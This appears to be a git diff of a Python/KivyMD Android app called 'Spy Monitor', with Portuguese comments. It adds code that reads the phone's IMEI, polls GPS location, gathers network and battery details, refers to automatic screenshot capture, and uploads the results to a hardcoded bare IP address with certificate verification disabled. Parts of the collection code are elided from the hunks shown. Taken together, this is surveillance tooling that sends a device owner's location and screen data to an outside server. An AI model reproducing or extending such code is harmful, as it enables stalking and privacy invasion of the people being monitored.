@@ -1,10 +1,41 @@
-# Arquivo legado - migrado para app_toga.py
-# Este arquivo será removido após migração completa
+# Spy Monitor App - KivyMD Version
+# Aplicação principal de monitoramento usando KivyMD
 
-print("Este arquivo foi migrado para app_toga.py")
-print("Use: python -m spymonitor.app_toga")
-    def build(self):
-        """Inicializar a aplicação de monitoramento"""
+import kivy
+from kivymd.app import MDApp
+from kivymd.uix.boxlayout import MDBoxLayout
+from kivymd.uix.label import MDLabel
+from kivymd.uix.button import MDRaisedButton
+from kivymd.uix.textfield import MDTextField
+from kivymd.uix.scrollview import ScrollView
+from kivy.metrics import dp
+from kivy.clock import Clock
+import time
+import threading
+import requests
+import json
+from datetime import datetime
+import uuid
+import platform
+import logging
+import queue
+import os
+
+# Configuração do servidor externo
+SERVER_URL = "https://147.79.111.118"
+
+# Configurações otimizadas para coleta leve
+COLLECTION_INTERVAL = 120  # segundos (mais espaçado para reduzir bateria)
+SCREENSHOT_INTERVAL = 120  # segundos (2 minutos para screenshots)
+REQUEST_TIMEOUT = 20  # segundos (mais tempo para conexões lentas)
+MAX_RETRIES = 5  # mais tentativas para confiabilidade
+BATCH_SIZE = 3  # lotes menores para evitar sobrecarga
+
+class SpyMonitor(MDApp):
+    """Aplicação principal de monitoramento usando KivyMD"""
+
+    def __init__(self, **kwargs):
+        super().__init__(**kwargs)
         # Variáveis de controle
         self.is_monitoring = False
         self.device_id = self.get_device_id()
@@ -14,6 +45,12 @@ print("Use: python -m spymonitor.app_toga")
         self.last_collection = 0
         self.last_screenshot = 0
 
+    def main_module(self):
+        """Retorna o módulo principal para briefcase"""
+        return "spymonitor.app"
+
+    def build(self):
+        """Inicializar a aplicação de monitoramento"""
         # Criar interface principal com KivyMD
         main_layout = MDBoxLayout(orientation='vertical', spacing=dp(10), padding=dp(20))
 
@@ -75,7 +112,7 @@ print("Use: python -m spymonitor.app_toga")
         self.add_log(f"Servidor: {SERVER_URL}")
 
         return main_layout
-    
+
     def get_device_id(self):
         """Gera ID único do dispositivo"""
         try:
@@ -83,47 +120,47 @@ print("Use: python -m spymonitor.app_toga")
             if platform.system() == 'Android':
                 from android.permissions import request_permission, Permission
                 from jnius import autoclass
-                
+
                 try:
                     request_permission(Permission.READ_PHONE_STATE)
                     TelephonyManager = autoclass('android.telephony.TelephonyManager')
                     Context = autoclass('android.content.Context')
                     PythonActivity = autoclass('org.kivy.android.PythonActivity')
-                    
+
                     activity = PythonActivity.mActivity
                     tm = activity.getSystemService(Context.TELEPHONY_SERVICE)
                     device_id = tm.getDeviceId()
-                    
+
                     if device_id:
                         return device_id
                 except:
                     pass
-            
+
             # Fallback: gerar ID único baseado no dispositivo
             import hashlib
             unique_string = f"{platform.node()}-{platform.machine()}-{platform.processor()}"
             return hashlib.md5(unique_string.encode()).hexdigest()[:15]
         except:
             return str(uuid.uuid4())[:15]
-    
+
     def add_log(self, message):
         """Adiciona mensagem aos logs"""
         timestamp = datetime.now().strftime('%H:%M:%S')
         log_entry = f"[{timestamp}] {message}\n"
-        
+
         current_text = self.logs_text.value or ""
         lines = (current_text + log_entry).split('\n')
         if len(lines) > 20:
             lines = lines[-20:]
         self.logs_text.value = '\n'.join(lines)
-    
+
     def toggle_monitoring(self, instance):
         """Alterna monitoramento"""
         if not self.is_monitoring:
             self.start_monitoring()
         else:
             self.stop_monitoring()
-    
+
     def start_monitoring(self):
         """Inicia monitoramento"""
         self.is_monitoring = True
@@ -141,7 +178,7 @@ print("Use: python -m spymonitor.app_toga")
         self.monitoring_thread.start()
 
         self.add_log("Monitoramento iniciado - Captura automática de screenshots ativada")
-    
+
     def stop_monitoring(self):
         """Para monitoramento"""
         self.is_monitoring = False
@@ -150,13 +187,13 @@ print("Use: python -m spymonitor.app_toga")
         self.monitor_button.text = '▶️ Iniciar Monitoramento'
         self.monitor_button.md_bg_color = (0.19, 0.68, 0.38, 1)  # Verde
         self.add_log("Monitoramento parado - Captura de screenshots desativada")
-    
+
     def test_server_connection(self):
         """Testa conexão com servidor"""
         try:
             response = requests.get(f"{SERVER_URL}/api/test/", timeout=REQUEST_TIMEOUT, verify=False)
             if response.status_code == 200:
-        self.add_log("✅ Servidor conectado")
+                self.add_log("✅ Servidor conectado")
                 return True
             else:
                 self.add_log(f"⚠️ Resposta do servidor: {response.status_code}")
@@ -164,7 +201,7 @@ print("Use: python -m spymonitor.app_toga")
         except requests.exceptions.RequestException as e:
             self.add_log(f"❌ Erro de conexão: {str(e)[:50]}")
             return False
-    
+
     def monitoring_loop(self):
         """Loop principal de monitoramento otimizado"""
         while self.is_monitoring:
@@ -186,7 +223,7 @@ print("Use: python -m spymonitor.app_toga")
             except Exception as e:
                 self.add_log(f"Erro no loop principal: {str(e)[:50]}")
                 time.sleep(10)
-    
+
     def collect_and_send_data(self):
         """Coleta e envia dados para o servidor de forma otimizada e leve"""
         try:
@@ -230,29 +267,29 @@ print("Use: python -m spymonitor.app_toga")
 
         except Exception as e:
             self.add_log(f"❌ Erro na coleta: {str(e)[:40]}")
-    
+
     def get_location(self):
         """Obtém localização do dispositivo"""
         try:
             if platform.system() == 'Android':
                 from plyer import gps
-                
+
                 # Configurar GPS
                 gps.configure(on_location=self.on_location_update)
                 gps.start(minTime=1000, minDistance=1)
-                
+
                 # Aguardar um pouco pela localização
                 time.sleep(2)
                 gps.stop()
-                
+
                 if hasattr(self, 'last_location'):
                     return self.last_location
-            
+
             return None
         except Exception as e:
             self.add_log(f"Erro no GPS: {str(e)[:30]}")
             return None
-    
+
     def on_location_update(self, **kwargs):
         """Callback para atualização de localização"""
         self.last_location = {
@@ -260,14 +297,14 @@ print("Use: python -m spymonitor.app_toga")
             'longitude': kwargs.get('lon'),
             'accuracy': kwargs.get('accuracy')
         }
-    
+
     def get_network_info(self):
         """Obtém informações de rede"""
         try:
             import socket
             hostname = socket.gethostname()
             local_ip = socket.gethostbyname(hostname)
-            
+
             return {
                 'hostname': hostname,
                 'local_ip': local_ip,
@@ -275,7 +312,7 @@ print("Use: python -m spymonitor.app_toga")
             }
         except:
             return None
-    
+
     def get_battery_info(self):
         """Obtém informações da bateria (Android)"""
         try:
@@ -344,7 +381,7 @@ print("Use: python -m spymonitor.app_toga")
 
         except Exception as e:
             self.add_log(f"❌ Erro no upload: {str(e)[:40]}")
-    
+
     def send_collected_data(self, data_list):
         """Envia dados coletados de forma otimizada com retry"""
         for data_type, data in data_list:
@@ -408,7 +445,7 @@ print("Use: python -m spymonitor.app_toga")
                 self.send_data_with_retry(data_type, data, retry_count + 1)
             else:
                 self.add_log(f"❌ Erro {data_type}: {str(e)[:25]}")
-    
+
     def on_stop(self):
         """Fechamento da aplicação"""
         self.is_monitoring = False
